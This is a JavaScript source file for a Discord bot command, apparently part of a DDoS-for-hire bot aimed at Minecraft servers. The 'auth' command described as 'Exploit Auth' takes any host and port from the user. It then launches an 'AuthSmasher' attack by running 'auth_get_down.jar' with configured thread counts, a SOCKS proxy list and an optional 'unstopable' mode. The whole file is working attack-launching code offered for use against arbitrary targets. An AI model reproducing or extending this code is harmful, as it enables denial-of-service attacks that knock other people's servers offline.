/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');
const hostValidattor = require('is-valid-hostname');
const Attack = require('../structure/attack.js');
const crashers = require('../functions/crashers.js');

module.exports = new Command({
    name: "auth",
    description: "Exploit Auth",
    permissions: "SEND_MESSAGES",
    disableOnAttack: true,
    slashCommandOptions: [{
        name: "host",
        type: "STRING",
        description: "Enter host or ip server",
        required: true
    }, {
        name: "port",
        description: "Enter port server",
        type: "NUMBER",
        required: false
    }, {
        name: "unstopable",
        description: "Unstopable testing",
        type: "BOOLEAN",
        required: false
    }],
    async execute(client, args, interaction){
        const host = args.getString("host");
        const port = args.getNumber("port") || 25565;
        const unstop = args.getBoolean("unstopable") || false;

        if (hostValidattor(host) == false) return crashers.errorembed(client, interaction, interaction.commandName, "Не валидный IP");

        const attack = new Attack({
            jaroptions: {
                jarname: "auth_get_down.jar",
                jarargs: `${host}:${port} ${threads.auth} 0 auth socks_proxies.txt`
            },
            client: client,
            interaction: interaction,
            AttacksArray: client.attacks,
            method: "AuthSmasher 💥",
            host: host,
            port: `${port}`,
            unstopable: unstop,
            ownerID: interaction.user.id
        })

        client.attacks.set(host, attack);
    }
});